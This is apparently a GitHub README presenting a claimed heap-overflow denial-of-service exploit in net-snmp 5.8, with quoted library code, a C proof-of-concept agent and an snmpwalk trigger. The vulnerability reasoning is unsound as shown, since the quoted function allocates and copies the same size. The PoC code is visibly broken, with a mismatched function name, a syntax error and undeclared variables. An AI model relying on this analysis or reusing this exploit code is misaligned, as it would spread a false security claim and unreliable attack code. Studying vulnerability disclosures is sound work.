# NET-SNMP-Heap-overflow
A brief overview of Heap overflow vulnerability in NET-SNMP

Title: net-snmp 5.8 - (Authenticated) Heap overflow (DOS PoC)  
Vulnerability Discovered by: Alireza Chegini (@nimaarek)  
Exploit Author: Alireza Chegini (@nimaarek)  
Vendor Homepage: http://net-snmp.org  
Software Link: https://sourceforge.net/projects/net-snmp/files/net-snmp/5.8/  
Version: 5.8  
Tested on: Manager in the Win 8.1 and Agent in Ubuntu 18  

###### Vulnerability Description

The vulnerability is in a function called **netsnmp_memdup** that duplicates a memory block, which is in the ``` net-snmp-5.8\snmplib\tools.c``` this function uses a unsafe function called **memcpy** (SDL bans) that does not check the copy destination buffer size.
```C
void *netsnmp_memdup(const void *from, size_t size)
{
    void *to = NULL;

    if (from) {
        to = malloc(size);
        if (to)
            memcpy(to, from, size);
    }
    return to;
}
```
There are many functions in this library that call this function (netsnmp_memdup) but most of them check the copy destination buffer size but one of the functions that does not do this is called **netsnmp_table_set_add_default_row**. this function is used to adds a new default row to a table.
```C
int netsnmp_table_set_add_default_row (netsnmp_table_data_set *table_set, unsigned int column, int type, int writable, void *default_value, size_t default_value_len)
```
Definition at line 305 of file ```net-snmp-5.8\agent\helpers\table_dataset.c```
Arguments should be the table_set, column number, variable type and finally a 1 if it is allowed to be writable, or a 0 if not. If the default_value field is not NULL, it will be used to populate new valuse in that column fro newly created rows. It is copied into the storage template (free your calling argument).
On line 345 of this function, the **netsnmp_memdup** function is called:
```C
new_col = SNMP_MALLOC_TYPEDEF(netsnmp_table_data_set_storage);
if (new_col == NULL)
    return SNMPERR_GENERR;
new_col->type = type;
new_col->writable = writable;
new_col->column = column;
if (default_value) {
    new_col->data.voidp = netsnmp_memdup(default_value, default_value_len);
    new_col->data_len = default_value_len;
}
```

The Heap overflow vulnerability occurs when the memory allocated by malloc is smaller than the size of the memory block to be copied.

###### Proof of discovery

```C
/** @example poc.c

 *  this is just an example to show the vulnerability
 *  Makefile contains the following code
 *  CC=gcc

 *  OBJS = VulnAgent.o
 *  TARGETS = VulnAgent
 *  FILENAME = VulnAgent.c
 *  CFLAGS = -I. `net-snmp-config --cflags`
 *  BUILDLIBS = `net-snmp-config --libs`
 *  BUILDAGENTLIBS = `net-snmp-config --agent-libs`
 * 
 *  all: $(TARGETS)

 *  BUG: $(OBJS)
 *    $(CC) $(CFLAGS) -o $(TARGETS) $(FILENAME) $(BUILDLIBS) $(BUILDAGENTLIBS)
 *  clean:
 *    rm $(OBJS) $(TARGETS)

 *  Build (using make):
 *  make BUG

 *  Run agent:
 *  ./VulnAgent

 *  Send request from Manager:
 *  snmpwalk -v 2c -c AliReza [AgentIp] 1.3.6.1.4.1.41414242.2.2.1
 *  BOOOOOOOOOOOOOOOOOOM
 */


#include <net-snmp/net-snmp-config.h>
#include <net-snmp/net-snmp-includes.h>
#include <net-snmp/agent/net-snmp-agent-includes.h>
#include <net-snmp/net-snmp-features.h>
#include <net-snmp/config_api.h>

// ProtoTYpe
void CreateBuggyTable();

void main() {
    /* load default snmpd.conf */
    init_agent("snmpd");
    /* bug here :) */
    CreateTable();
    /*  Initialize MIBs. */
    init_mib_modules();
    /* load default snmpd.conf */
    init_snmp("snmpd");
    /* show packet detail */
    netsnmp_ds_set_boolean(NETSNMP_DS_LIBRARY_ID, NETSNMP_DS_LIB_DUMP_PACKET, 1);
    /* ...make us an Master Agent  */
    netsnmp_ds_set_boolean(NETSNMP_DS_APPLICATION_ID, NETSNMP_DS_AGENT_ROLE, 0);
    /* set snmp version to 2c */
    netsnmp_ds_set_int(NETSNMP_DS_LIBRARY_ID, NETSNMP_DS_LIB_SNMPVERSION, NETSNMP_DS_SNMP_VERSION_2c);
    /* set default port 161 */
    netsnmp_ds_set_int(NETSNMP_DS_LIBRARY_ID, NETSNMP_DS_LIB_DEFAULT_PORT, 161);
    /* set community string */
    vacm_parse_rocommunity("rocommunity", "AliReza");
    /*  Listen on default port (161).  */
    init_master_agent();
    while (1)
    {
        agent_check_and_process(1); /* 0 == don't block */
    }
    /*  At shutdown time:  */
    snmp_shutdown("snmpd");
    SOCK_CLEANUP;
}

void CreateBuggyTable() {
    int r = 0;

    // the OID we want to register our integer at.
    oid my_registration_oid[] = {1, 3, 6, 1, 4, 1, 41414242, 2, 2, 1};

    // create the table struct itself
    g_TableSet = netsnmp_create_table_data_set("nimaarekTable");

    // comment out or remove this line if no support for creation of rows
    g_TableSet->allow_creation = 1;

    // add the index
    netsnmp_table_set_add_indexes(g_TableSet, ASN_INTEGER, 0);

    // create the columns
    char ali[1024];
    netsnmp_table_set_add_default_row(g_TableSet, 1, ASN_OCTET_STR, 1, ali, 0);

    // register the table with the agent
    netsnmp_register_table_data_set(
        netsnmp_create_handler_registration(
            "nimaarekTable", NULL, my_registration_oid,
            OID_LENGTH(my_registration_oid),, HANDLER_CAN_RWRITE),
        g_TableSet, NULL);

    // create a dummy row
    row = netsnmp_create_table_data_row();

    netsnmp_table_row_add_index(1, ASN_INTEGER, r, sizeof(r));

    // now fill in the columns with incrementing integral data
    netsnmp_set_row_column(row, 2, ASN_INTEGER, r, sizeof(r));
    netsnmp_mark_row_column_writable(row, 2, 1);

    // add the row
    netsnmp_table_dataset_add_row(g_TableSet, row);

    netsnmp_register_auto_data_table(g_TableSet, NULL);
}
```
###### DEMO

![alt text](https://raw.githubusercontent.com/AlirezaChegini/NET-SNMP-Heap-overflow/master/POC.GIF "Logo Title Text 1")

###### FRIENDS

MarYam (My Lovely  :yellow_heart:
:blue_heart:
:purple_heart:
:heart:
:green_heart:)  
Amir Hesam Olfati  
AHA (GODvB?? :trollface: )  

###### SITE n FORUM
[webscene](https://webscene.ir)  
[iranled](http://www.iranled.com)  
[(PRIVATE *)TEAM-IRA](127.0.0.1)

###### Contact
[twitter: @nimaarek](https://twitter.com/nimaarek/)  
[telegram: @moonshaker](https://telegram.me/moonshaker)  
[linkedin: alireza-chegini-nimaarek](https://linkedin.com/in/alireza-chegini-nimaarek)  
[E-Mail](mailto:coc.nimaarek@gmail.com)  
